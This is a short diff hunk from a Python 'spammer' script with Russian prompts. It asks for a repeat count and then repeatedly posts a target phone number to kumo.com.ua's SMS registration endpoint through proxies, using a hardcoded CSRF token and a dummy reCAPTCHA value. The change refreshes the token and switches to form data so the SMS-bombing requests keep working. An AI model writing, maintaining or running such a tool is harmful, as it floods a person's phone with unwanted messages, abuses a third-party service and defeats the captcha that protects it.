@@ -51,7 +51,8 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://kumo.com.ua/registration/sms/", json={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
+         formatted_phone = format_phone(number, "+###+##+###+##+##")
+         requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "l0H2NaVjz5Lr07eKrGrz8aR8FZ1tAHiPB6bwVaz0", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
          print('kumo.com.ua')
  except:
          print('Не отправлено (kumo.com.ua)')
